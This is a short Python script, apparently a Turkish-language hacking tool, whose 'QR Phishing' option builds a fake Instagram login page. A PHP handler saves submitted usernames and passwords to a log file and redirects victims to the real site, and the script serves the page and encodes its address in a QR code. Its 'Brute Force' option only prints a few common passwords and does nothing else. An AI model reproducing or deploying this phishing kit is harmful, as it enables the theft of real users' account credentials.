import os
os.system("clear")
print("LIGHT TOOL")
print("Yapimci: eymoderler655")
print("Discord: eymoderler655")
while True:
    print("\n[1] QR Phishing")
    print("[2] Brute Force")
    print("[0] Cikis")
    s = input("Secim: ")
    if s == "1":
        os.system("mkdir -p site")
        os.system("echo '<html><body><center><h2>Instagram</h2><form method=POST action=login.php><input name=user><br><input name=pass type=password><br><button>Giris</button></form></center></body></html>' > site/index.html")
        os.system("echo '<?php file_put_contents(\"log.txt\",\"Kullanici: \".\$_POST[\"user\"].\" Sifre: \".\$_POST[\"pass\"].\"\n\",FILE_APPEND); header(\"Location: https://instagram.com\"); ?>' > site/login.php")
        os.system("cd site && php -S 0.0.0.0:8080 &")
        os.system("qrencode -o qr.png 'http://192.168.1.1:8080'")
        print("Sunucu: http://localhost:8080")
        print("QR kod: qr.png")
        print("Loglar: site/log.txt")
    elif s == "2":
        h = input("Hedef kullanici: ")
        print("Brute force basladi...")
        for p in ["123456","password","123456789","qwerty","iloveyou"]:
            print(f"Deniyorum: {p}")
    elif s == "0":
        break
